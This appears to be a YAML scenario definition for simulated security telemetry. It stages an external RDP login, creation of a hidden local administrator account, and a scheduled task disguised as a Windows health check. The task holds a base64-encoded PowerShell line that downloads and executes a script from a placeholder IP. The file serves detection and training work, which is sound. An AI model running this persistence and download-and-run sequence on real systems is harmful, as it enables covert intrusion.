  warmup: 1h
generation_seed: 8227
baseline_activity:
  description: Quiet afternoon
  intensity: medium
  variation: low
  suspicious_noise: medium
observation_profile: complete
storyline:
- id: rdp
  time: +43m
  actor: ian.doyle
  system: WS-MFISCHER-01
  activity: RDP from external IP
  events:
  - type: rdp_session
    source_ip: 192.0.2.199
- id: persist
  time: +47m
  actor: ian.doyle
  system: WS-MFISCHER-01
  activity: Local admin + hidden PowerShell task
  events:
  - type: account_created
    target_username: adm_temp
  - type: group_member_added
    group_name: Administrators
    member_name: adm_temp
    scope: local
  - type: scheduled_task_created
    task_name: \Microsoft\Windows\HealthCheck
    task_content: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADAALgAyAC4AMQA5ADkALwBhAC4AcABzADEAKQA=
